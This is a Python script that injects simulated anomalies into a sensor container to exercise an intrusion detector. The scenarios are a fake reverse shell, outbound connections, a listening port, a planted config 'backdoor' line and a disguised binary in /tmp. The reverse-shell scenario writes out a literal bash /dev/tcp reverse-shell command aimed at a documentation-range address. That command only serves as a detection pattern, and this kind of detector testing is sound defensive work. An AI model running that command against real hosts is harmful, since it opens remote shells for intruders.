"""Inject harmless, simulated anomalies inside the sensor container.

No real malware or shells: the reverse-shell scenario only creates a sleeping process
whose command line contains the pattern. Network scenarios target 203.0.113.0/24
(RFC 5737 documentation range) on the Docker *internal* network only.

    python3 inject_anomaly.py <scenario> [--seconds 30]
"""

import argparse
import multiprocessing
import os
import shutil
import socket
import subprocess
import sys
import time
from pathlib import Path

SINK = ("203.0.113.50", 443)
CONF = Path("/etc/sensor/sensor.conf")


def reverse_shell(seconds: int) -> None:
    pattern = "bash -i >& /dev/tcp/203.0.113.66/4444 0>&1"
    subprocess.Popen([sys.executable, "-c", f"import time; time.sleep({seconds})", pattern])


def egress(seconds: int) -> None:
    # Hold an idle connection open: the sink waits for a request line, so the socket
    # stays ESTABLISHED long enough for the detector's next sample.
    with socket.create_connection(SINK, timeout=5):
        time.sleep(seconds)


def listen_port(seconds: int) -> None:
    with socket.socket() as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", 31337))
        s.listen()
        time.sleep(seconds)


def config_change(_: int) -> None:
    with CONF.open("a") as f:
        f.write(f"debug_backdoor=enabled  # injected {time.time():.0f}\n")


def _burn(until: float) -> None:
    while time.time() < until:
        pass


def cpu_spike(seconds: int) -> None:
    until = time.time() + seconds
    procs = [multiprocessing.Process(target=_burn, args=(until,)) for _ in range(os.cpu_count() or 1)]
    for p in procs:
        p.start()
    for p in procs:
        p.join()


def tmp_exec(seconds: int) -> None:
    target = Path("/tmp/.cache/updater")
    target.parent.mkdir(parents=True, exist_ok=True)
    shutil.copy(shutil.which("sleep") or "/bin/sleep", target)
    target.chmod(0o755)
    subprocess.Popen([str(target), str(seconds)])


SCENARIOS = {
    "reverse_shell": reverse_shell,
    "egress": egress,
    "listen_port": listen_port,
    "config_change": config_change,
    "cpu_spike": cpu_spike,
    "tmp_exec": tmp_exec,
}

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("scenario", choices=sorted(SCENARIOS))
    parser.add_argument("--seconds", type=int, default=30)
    args = parser.parse_args()
    print(f"[inject] {args.scenario} ({args.seconds}s) - simulasi, hanya jaringan internal")
    SCENARIOS[args.scenario](args.seconds)
